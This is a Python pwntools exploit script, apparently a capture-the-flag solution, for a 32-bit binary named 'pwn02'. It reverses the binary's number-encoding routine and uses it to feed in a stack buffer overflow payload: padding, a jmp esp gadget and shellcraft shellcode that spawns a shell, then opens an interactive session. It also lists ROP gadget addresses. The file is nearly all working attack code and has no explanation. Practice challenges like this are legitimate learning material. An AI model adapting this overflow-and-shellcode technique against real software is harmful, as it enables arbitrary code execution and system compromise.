from pwn import *
from uint32 import *

import re
with open('./pwn02/pwn02.txt', 'r') as f:
    code = f.read()
matchs = re.finditer(r"([+\-^])\s*([0-9A-Fa-zx]+)", code, re.MULTILINE)

operations = []
for matchNum, match in enumerate(matchs, start=1):
    operations.append((match.group(1), int(match.group(2), 0)))
    
operations = operations[::-1]

def encrypt(num: u32):
    for op in operations:
        if op[0] == '+':
            num -= op[1]
        elif op[0] == '-':
            num += op[1]
        elif op[0] == '^':
            num ^= op[1]
        else:
            raise ValueError(f"Unknown operation: {op[0]}")
        num &= 0xFFFFFFFF
    if num > 0x7FFFFFFF:
        num -= 0x100000000
    return num

def reverse(num: UnsignedInt32):
    for op in operations:
        lop = UnsignedInt32(op[1])
        if op[0] == '+':
            num = num - lop
        elif op[0] == '-':
            num = num + lop
        elif op[0] == '^':
            num ^= lop
        else:
            raise ValueError(f"Unknown operation: {lop}")
    return num

def interact(num):
    io.recvuntil(b"Give me a number\n")
    io.sendline(str(encrypt(num)).encode())
    io.recvuntil(b"The number is ")
    return int(io.recvuntil(b"\n").strip())

context.log_level = 'debug'
context.arch = 'i386'
io = process('./pwn02/pwn02')
"""
0x080d6ec3 : jmp esp;
0x080ca950 : call esp
0x080481b2 : ret
0x080b93b6 : pop eax ; ret
0x080481c9 : pop ebx ; ret
0x080dfd49 : pop ecx ; ret
0x08048480 : pop edi ; ret
0x0806fedb : pop edx ; ret
"""

jmp_esp = 0x080d6ec3
call_esp = 0x080ca950
ret = 0x080481b2


shellcode = asm(shellcraft.sh())


data = flat(b"A"*(0x34+4) + p32(call_esp) + shellcode)
data = flat(b"A"*(0x34+4) + p32(jmp_esp) + shellcode)



if len(data) % 4 != 0:
    data += b'\x00' * (4 - len(data) % 4)

for i in range(0, len(data), 4):
    num = u32(data[i:i+4])
    res = interact(num)
    assert num == res or 2**32 + res == num, f"Expected {num}, got {res}, {2**32 + res} instead"

interact(0)
io.interactive()